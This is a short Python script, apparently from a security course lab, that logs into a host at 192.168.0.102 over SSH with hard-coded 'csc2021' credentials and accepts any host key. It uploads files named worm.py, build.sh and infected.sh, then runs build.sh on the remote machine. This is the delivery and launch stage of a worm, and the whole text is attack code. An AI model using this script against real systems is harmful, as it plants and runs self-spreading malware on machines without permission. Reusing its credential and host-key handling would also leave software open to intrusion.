import paramiko

s = paramiko.SSHClient()
s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
s.connect("192.168.0.102", 22, username="csc2021", password='csc2021', timeout=4)

sftp = s.open_sftp()
sftp.put('./worm.py', 'worm.py')
sftp.put('./build.sh', 'build.sh')
sftp.put('./infected.sh', 'infected.sh')

stdin, stdout, stderr = s.exec_command("chmod +x build.sh")
print(stdout.read().decode())

stdin, stdout, stderr = s.exec_command("./build.sh")
print(stdout.read().decode())

sftp.close()
